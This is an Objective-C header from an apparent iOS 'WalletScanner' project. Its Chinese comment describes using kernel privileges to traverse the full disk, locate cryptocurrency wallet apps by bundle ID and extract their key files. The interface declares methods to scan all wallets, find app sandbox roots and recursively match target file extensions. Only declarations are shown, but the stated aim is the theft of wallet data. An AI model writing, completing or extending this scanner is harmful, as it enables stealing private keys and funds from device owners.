//
//  RDFileScanner.h
//  WalletScanner
//
//  文件系统扫描器 — 利用内核权限遍历全磁盘，定位钱包App并提取关键文件
//

#import <Foundation/Foundation.h>
#import "RDWalletTarget.h"

NS_ASSUME_NONNULL_BEGIN

// 扫描结果
@interface RDScannedFile : NSObject
@property (nonatomic, copy) NSString *walletName;
@property (nonatomic, copy) NSString *bundleID;
@property (nonatomic, copy) NSString *fullPath;
@property (nonatomic, copy) NSString *fileName;
@property (nonatomic, assign) unsigned long long fileSize;
@property (nonatomic, copy) NSDate *modificationDate;
@end

@interface RDFileScanner : NSObject

// 扫描所有钱包 ← 主入口
+ (NSArray<RDScannedFile *> *)scanAllWallets;

// 扫描单个钱包
+ (NSArray<RDScannedFile *> *)scanWallet:(RDWalletTarget *)target;

// 定位某个BundleID的沙盒根目录
+ (nullable NSString *)sandboxRootForBundleID:(NSString *)bundleID;

// 递归扫描目录，匹配指纹
+ (NSArray<RDScannedFile *> *)scanDirectory:(NSString *)directory
                            withExtensions:(NSArray<NSString *> *)extensions
                                walletName:(NSString *)name
                                  bundleID:(NSString *)bundleID;

@end

NS_ASSUME_NONNULL_END
